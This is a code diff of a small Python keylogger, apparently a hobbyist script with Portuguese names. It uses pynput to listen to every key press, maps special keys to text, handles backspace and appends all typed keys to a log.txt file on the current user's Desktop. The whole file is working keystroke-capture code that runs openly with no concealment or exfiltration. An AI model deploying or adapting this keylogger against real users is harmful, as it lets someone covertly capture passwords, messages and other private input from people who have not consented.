@@ -1,44 +1,52 @@
-﻿from pynput.keyboard import Listener
-import sys
+﻿from pynput import keyboard
+from pathlib import Path
+import os
 
+user = os.path.expanduser("~")
+caminho = f"{user}\Desktop"
 
-logFile = r"C:\Users\marcelo\Desktop\keylog.txt"
+def main(key):
 
-def writeLog(key):
+    if str(key) == "Key.backspace":
+        with open(f"{caminho}\log.txt", "r") as archive:
+            copia = archive.readlines()
+        if len(copia) > 0:
+            new = copia[-1][:-1]
+            copia.pop()
+            copia.append(new)
+            with open(f"{caminho}\log.txt", "w") as archive:
+                archive.writelines(copia)
 
-    teclas = {
-	"Key.space": " ",
-	"Key.shift_r": "",
-	"Key.shift_l": "",
-	"Key.enter": "\n",
-	"Key.alt": "",
-	"Key.esc": "",
-	"Key.cmd": "",
-	"Key.caps_lock": "",
-	}
+    teclas = str(key)
 
+    words = {
+                "Key.space":" ",
+		"Key.enter":"\n",
+		"Key.shift_l":"",
+		"Key.alt":"",
+		"Key.esc": "",
+		"Key.cmd":"",
+		"Key.caps_lock": "",
+                "Key.ctrl_l":"",
+                "Key.down":"",
+                "Key.up":"",
+                "Key.shift_r":"",
+                "Key.backspace": "",
+		}
+    
+    teclas = teclas.replace("'", "")
+    teclas = teclas.replace("[", "")
+    teclas = teclas.replace("]", "")
 
-    #converter a tecla pressionada para string
-    keydata = str(key)
-        
-    keydata = keydata.replace("'", "")
+    for key in words:
+        teclas =  teclas.replace(key, words[key])
 
-    for key in teclas:
-        keydata = keydata.replace(key, teclas[key])
+    with open(f"{caminho}\log.txt", "a") as archive:
+        archive.write(teclas)
 
-    try:
-        arq = open(logFile)
+try:
+    with keyboard.Listener(on_press=main) as archive:
+        archive.join()
 
-    except FileNotFoundError:
-        with open(logFile, "w") as arquivo:
-            pass
-
-    with open(logFile, "a") as arquivo:
-        arquivo.write(keydata)
-
-#abrir o Listener do teclado e escutar o evento on_press
-#quando o evento on_press ocorrer, chamar a função writeLog
-with Listener(on_press=writeLog) as listener:
-    listener.join()
-
- 
+except KeyboardInterrupt:
+    print("Programa finalizado com Sucesso!!")
